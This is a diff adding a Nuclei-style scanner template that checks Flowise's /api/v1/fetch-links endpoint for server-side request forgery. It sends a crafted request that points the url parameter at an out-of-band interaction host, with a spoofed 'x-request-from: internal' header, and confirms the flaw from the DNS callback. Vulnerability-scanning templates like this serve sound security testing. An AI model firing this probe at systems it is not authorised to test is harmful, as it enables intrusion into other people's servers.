@@ -1,0 +1,35 @@
+id: Flowise-fetch-links-ssrf
+
+info:
+  name: Flowise-fetch-links-ssrf
+  author: iSee857
+  severity: high
+  description: |
+    Flowise-fetch-links-ssrf.
+  metadata:
+    verified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        GET /api/v1/fetch-links?url=http%3A%2F%2F{{interactsh-url}}&relativeLinksMethod=webCrawl&limit=10 HTTP/1.1
+        Host: {{Hostname}}
+        x-request-from: internal
+
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'status":"OK"'
+          - 'links'
+        condition: and
